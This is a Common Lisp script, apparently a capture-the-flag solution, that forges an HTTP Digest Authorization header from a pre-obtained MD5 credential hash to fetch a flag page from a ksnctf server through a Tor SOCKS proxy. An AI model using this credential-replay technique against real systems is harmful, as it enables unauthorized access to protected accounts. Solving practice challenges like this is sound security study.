(ql:quickload :ironclad)
(ql:quickload :flexi-streams)
(ql:quickload :dexador)
(ql:quickload :cl-ppcre)

(defun encode-md5 (s)
  (ironclad:byte-array-to-hex-string
   (ironclad:digest-sequence :md5
                             (flexi-streams:string-to-octets s :external-format :UTF-8))))

(defparameter username "q9")

(defparameter a1 "c627e19450db746b739f41b64097d449")
(defparameter a2 (encode-md5 "GET:/~q9/flag.html"))

(defparameter qop "auth")

(defparameter algorithm "MD5")

(defparameter realem "secret")

(defparameter cnonce "84a161a7c0a9dca2")

(defparameter nc "00000001")

(defparameter realm "secret")

(defparameter uri "/~q9/flag.html")

(defparameter baseurl "http://ksnctf.sweetduet.info:10080")

(defparameter url (concatenate 'string baseurl uri))

(defun get-nonce (s)
  (cl-ppcre:register-groups-bind (result)
                                 ("nonce=\"([\\w\+=]+)\"," s)
                                 result))
(defun main ()
  (let ((nonce ""))
    (handler-case (dex:get url :proxy "socks5://127.0.0.1:9050")
      (dex:http-request-failed (e)
        (let ((tmp-header (dex:response-headers e)))
          (setq nonce (get-nonce (gethash "www-authenticate" tmp-header))))))
    (let* ((response (encode-md5 (format nil "~A:~A:~A:~A:~A:~A" a1 nonce nc cnonce qop a2)))
           (result (concatenate 'string
                                "Digest username=\"" username
                                "\", realm=\"" realm
                                "\", nonce=\"" nonce
                                "\", uri=\"" uri
                                "\", algorithm=" algorithm
                                ", response=\"" response
                                "\", qop=" qop
                                ", nc=" nc
                                ", cnonce=\"" cnonce "\"")))
      (handler-case (let ((ans (dex:get url :proxy "socks5://127.0.0.1:9050" :headers `(("Authorization" . ,result)))))
                      (print ans))
        (error (e)
          (print e))))))
